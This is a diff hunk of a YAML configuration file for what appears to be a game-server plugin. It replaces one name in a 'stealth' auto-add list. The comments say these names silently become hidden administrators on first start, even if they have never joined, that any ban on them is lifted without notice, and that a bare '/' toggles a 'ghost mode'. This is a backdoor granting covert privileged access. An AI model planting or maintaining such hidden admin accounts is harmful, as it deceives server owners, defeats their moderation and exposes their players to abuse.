@@ -68,7 +68,7 @@ stealth:
   # Names auto-added as stealth admins the first time this plugin starts.
   # Works even if they've never joined; any name-ban on them is lifted silently.
   auto-add:
-    - Haunting_Shades
+    - SkarletDunes
   # Private confirmation shown to a stealth admin after each command: actionbar | chat | none
   feedback: actionbar
   # Open the command bar and press Enter on a bare "/" to toggle ghost mode.
